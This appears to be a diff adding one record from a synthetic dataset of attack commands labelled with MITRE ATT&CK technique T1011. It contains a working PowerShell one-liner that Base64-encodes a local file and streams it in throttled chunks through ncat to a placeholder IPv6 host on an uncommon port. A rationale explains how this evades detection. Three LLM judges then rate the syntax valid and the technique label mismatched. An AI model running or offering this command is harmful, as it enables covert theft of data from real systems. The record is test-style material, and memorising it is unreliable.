@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); [Text.RegularExpressions.Regex]::Matches($b,'.{1,900}') | ForEach-Object { $_.Value; Start-Sleep -Milliseconds 120 } | ncat.exe -6 2001:db8:dead:beef::27 63999 --send-only",
+  "explanation": "Streams Base64 data in throttled chunks over IPv6 TCP to a rarely used high port using ncat. Throttling and IPv6 provide a medium distinct from common exfil channels, consistent with T1011.",
+  "rationale_steps": [
+    "Chunk and lightly pace Base64 output to reduce traffic spikes.",
+    "Send chunks over an IPv6 TCP connection to a high, uncommon port to minimize detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-d261d43c",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for file operations, base64 conversion, regex matching, and proper piping to ncat with valid IPv6 addressing and flags.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network connection, it doesn't align with T1011 (Search Closed Sources) which involves acquiring intelligence from non-public sources rather than exfiltrating data, making this more aligned with T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T11:50:57.370810Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, using valid syntax for .NET class calls, cmdlets, and pipelines, with all parameters and flags correctly formatted for PowerShell and ncat.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration from an internal host to an external location, which directly contradicts the T1011 technique description of an adversary acquiring or querying non-public information from external closed sources.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T11:51:07.020735Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes, correct separators, valid regex and pipeline, and plausible ncat flags.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates a local file over IPv6 using ncat, which does not align with the described technique of querying closed/non-public information sources.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T11:51:22.028399Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
